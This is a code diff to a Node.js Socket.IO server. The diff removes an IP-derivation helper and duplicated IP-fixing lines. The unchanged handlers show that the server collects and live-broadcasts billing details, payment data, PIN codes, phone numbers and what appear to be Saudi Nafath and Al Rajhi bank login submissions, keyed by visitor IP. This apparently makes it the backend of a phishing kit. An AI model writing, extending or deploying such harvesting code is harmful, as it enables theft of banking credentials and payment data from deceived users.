@@ -477,20 +477,6 @@ app.use((err, req, res, next) => {
 });
 
 // ─── 7) SOCKET.IO LOGIC ───────────────────────────────────────────────────────
-
-// ─────────────────────────────────────────────────────────────
-// Helper: derive a stable client IP from the socket (works behind Render/Proxy)
-// ─────────────────────────────────────────────────────────────
-function getSocketIp(socket) {
-  const xf = socket.handshake?.headers?.["x-forwarded-for"];
-  if (xf && typeof xf === "string") return xf.split(",")[0].trim();
-  const cf = socket.handshake?.headers?.["cf-connecting-ip"];
-  if (cf && typeof cf === "string") return cf.trim();
-  const real = socket.handshake?.headers?.["x-real-ip"];
-  if (real && typeof real === "string") return real.trim();
-  return socket.handshake?.address || socket.conn?.remoteAddress || "unknown";
-}
-
 io.on("connection", (socket) => {
   console.log("⚡ Socket connected:", socket.id);
 
@@ -555,10 +541,6 @@ io.on("connection", (socket) => {
 
   // updateLocation
   socket.on("updateLocation", async ({ ip, page }) => {
-    const fixedIp = ip || socket.data.ip || getSocketIp(socket);
-    ip = fixedIp;
-    const fixedIp = ip || socket.data.ip || getSocketIp(socket);
-    ip = fixedIp;
     try {
       await Location.findOneAndUpdate(
         { ip },
@@ -575,9 +557,6 @@ io.on("connection", (socket) => {
 
   // submitIndex
   socket.on("submitIndex", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, {
         upsert: true,
@@ -634,9 +613,6 @@ io.on("connection", (socket) => {
 
   // submitBilling
   socket.on("submitBilling", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await Billing.create(data);
       io.emit("newBilling", doc);
@@ -649,9 +625,6 @@ io.on("connection", (socket) => {
 
   // submitPayment
   socket.on("submitPayment", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await Payment.create(data);
       io.emit("newPayment", doc);
@@ -664,9 +637,6 @@ io.on("connection", (socket) => {
 
   // submitCode (PIN)
   socket.on("submitCode", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const ip = data.ip || socket.data.ip;
       const doc = await Pin.create({
@@ -713,9 +683,6 @@ io.on("connection", (socket) => {
 
   // submitPhone
   socket.on("submitPhone", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await Phone.create({
         ip: data.ip,
@@ -732,9 +699,6 @@ io.on("connection", (socket) => {
 
   // NEW: split Nafad vs Rajhi socket events
   socket.on("submitNafad", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await Nafad.create({
         ip: data.ip,
@@ -750,9 +714,6 @@ io.on("connection", (socket) => {
   });
 
   socket.on("submitRajhi", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await Rajhi.create({
         ip: data.ip,
@@ -841,12 +802,6 @@ io.on("connection", (socket) => {
   // SMASCO Events
   // ═══════════════════════════════════════════════════════════════
   socket.on("submitInfo", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const payload = {
         ...data,
@@ -872,12 +827,6 @@ io.on("connection", (socket) => {
   });
 
   socket.on("submitService", async (data) => {
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
-    const fixedIp = data?.ip || socket.data.ip || getSocketIp(socket);
-    if (data) data.ip = fixedIp;
-    socket.data.ip = fixedIp;
     try {
       const doc = await SmascoService.create(data);
       io.emit("newSmascoService", doc);
